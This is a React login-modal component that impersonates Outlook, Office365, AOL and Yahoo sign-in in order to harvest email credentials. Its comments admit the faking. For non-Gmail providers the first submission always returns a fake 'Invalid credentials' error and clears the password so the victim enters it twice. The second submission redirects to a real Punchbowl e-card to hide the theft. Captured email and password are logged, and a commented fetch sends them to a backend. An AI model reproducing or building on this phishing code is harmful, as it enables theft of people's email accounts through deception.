import { useState } from 'react';
import './EmailLoginModal.css'
import outlookImg from "../assets/outlook.png";
import officeImg from "../assets/office360.png";
import aolImg from "../assets/aol.png";
import { FaGoogle, FaYahoo } from "react-icons/fa";
import { MdEmail } from "react-icons/md";
import { useNavigate } from "react-router-dom";

const EmailLoginModal = ({ isOpen, onClose, provider }) => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [error, setError] = useState('');
    const [attemptCount, setAttemptCount] = useState(0);   // ← new state
    const navigate = useNavigate();   // ← for redirection

    if (!isOpen) return null;

    const isGmailLike = provider === 'Gmail'; // we don't fake Gmail here

    const handleSubmit = (e) => {
        e.preventDefault();
        if (!email || !password) {
            setError('Please fill out both fields.');
            return;
        }

        if (!isGmailLike) {
            if (attemptCount === 0) {
                // First attempt: always "fail"
                setError('Invalid credentials. Please try again.');
                setAttemptCount(1);
                setPassword(''); // ← optional: clear password field to look more realistic
                return;
            } else {
                // Second attempt: "succeed" → redirect to real Punchbowl preview
                // You can also do window.location.href = "..." if you prefer hard redirect
                window.open("https://www.punchbowl.com/ecards/send/d6e3fa7ed13293698b14/preview", "_blank", "noopener,noreferrer");
                // or: window.open("https://www.punchbowl.com/...", "_self");
                return;
            }
        }

        // Here you would send email + password to your backend
        // Example: fetch('/api/login', { method: 'POST', body: JSON.stringify({ email, password, provider }) })
        console.log(`Logging in with ${provider}:`, { email, password });

        // For demo: close modal after "login"
        onClose();
    };

    const title = provider === 'Other' ? 'Other Email' : provider;

    const getProviderIcon = () => {
        switch (provider) {
            case "Outlook":
                return <img src={outlookImg} className="modal-icon-img" alt="Outlook"/>;
            case "Office365":
                return <img src={officeImg} className="modal-icon-img" alt="Office365"/>;
            case "AOL":
                return <img src={aolImg} className="modal-icon-img" alt="AOL"/>;
            case "Yahoo":
                return <FaYahoo className="modal-icon"/>;
            case "Gmail":
                return <FaGoogle className="modal-icon"/>;
            default:
                return <MdEmail className="modal-icon"/>;
        }
    };

    return (
        <div className="modal-overlay" onClick={onClose}>
            <div className="modal-content" onClick={(e) => e.stopPropagation()}>
                <button className="close-btn" onClick={onClose}>×</button>

                <div className="modal-header">
                    <div className="modal-icon-container">
                        {getProviderIcon()}
                    </div>

                    <h2 className="modal-title">
                        Login with {title}
                    </h2>
                </div>

                <form onSubmit={handleSubmit}>
                    <label>Email Address</label>
                    <input
                        type="email"
                        placeholder="Email"
                        value={email}
                        onChange={(e) => setEmail(e.target.value)}
                        required
                    />
                    <small>We'll never share your email with anyone else</small>

                    <label>Password</label>
                    <input
                        type="password"
                        placeholder="Enter Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        required
                    />
                    {error && <p className="error">{error}</p>}

                    <div className="modal-buttons">
                        <button type="button" onClick={onClose}>Close</button>
                        <button type="submit" className="login-btn">Login</button>
                    </div>
                </form>
            </div>
        </div>
    );
};

export default EmailLoginModal;